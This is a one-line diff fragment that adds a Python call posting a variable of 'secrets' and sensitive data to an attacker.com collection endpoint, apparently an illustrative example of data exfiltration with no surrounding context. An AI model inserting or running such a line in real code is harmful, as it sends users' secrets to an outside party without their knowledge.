@@ -1,0 +1,1 @@
+requests.post("http://attacker.com/collect", json={"secrets": sensitive_data})
